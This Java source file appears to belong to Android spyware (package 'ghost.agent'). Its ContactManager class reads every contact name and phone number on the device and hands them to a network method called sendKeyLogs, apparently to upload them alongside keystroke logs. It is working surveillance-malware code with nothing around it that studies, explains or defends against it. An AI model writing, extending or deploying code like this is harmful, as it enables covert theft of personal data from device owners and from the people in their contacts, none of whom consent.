package com.ghost.agent.core;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class ContactManager {
    
    private static final String TAG = "ContactManager";
    
    private Context context;
    private NetworkManager networkManager;
    
    public ContactManager(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
    }
    
    public JSONArray getAllContacts() {
        JSONArray contacts = new JSONArray();
        
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    JSONObject contact = new JSONObject();
                    contact.put("id", id);
                    contact.put("name", name);
                    
                    JSONArray phones = new JSONArray();
                    Cursor pCursor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null
                    );
                    
                    if (pCursor != null) {
                        while (pCursor.moveToNext()) {
                            String number = pCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.put(number);
                        }
                        pCursor.close();
                    }
                    
                    contact.put("phones", phones);
                    contacts.put(contact);
                }
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
        
        return contacts;
    }
    
    public void syncContacts() {
        JSONArray contacts = getAllContacts();
        if (contacts.length() > 0) {
            networkManager.sendKeyLogs(contacts.toString());
        }
    }
}
